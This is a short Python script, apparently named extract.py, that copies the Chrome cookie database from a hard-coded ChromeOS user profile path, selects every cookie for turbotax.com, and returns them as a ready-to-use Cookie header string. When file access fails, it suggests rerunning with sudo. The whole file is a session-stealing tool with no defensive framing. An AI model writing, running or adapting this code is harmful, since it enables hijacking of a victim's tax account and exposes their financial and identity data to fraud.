import sqlite3, os, shutil
def get_turbotax_session():
    cookie_path = os.path.expanduser('/home/chronos/u-ba30a127442047e9cca9eef292278f7c514d1c97/Network/Cookies')
    if not os.path.exists(cookie_path):
        cookie_path = '/home/chronos/u-ba30a127442047e9cca9eef292278f7c514d1c97/Cookies'
    temp_db = "cookies_temp.db"
    try:
        shutil.copyfile(cookie_path, temp_db)
    except PermissionError:
        print("[-] Permission Denied. Try running with: sudo python3 extract.py")
        return None
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    query = "SELECT name, value FROM cookies WHERE host_key LIKE '%turbotax.com%'"
    cursor.execute(query)
    cookies = {name: value for name, value in cursor.fetchall()}
    conn.close()
    os.remove(temp_db)
    return "; ".join([f"{k}={v}" for k, v in cookies.items()])
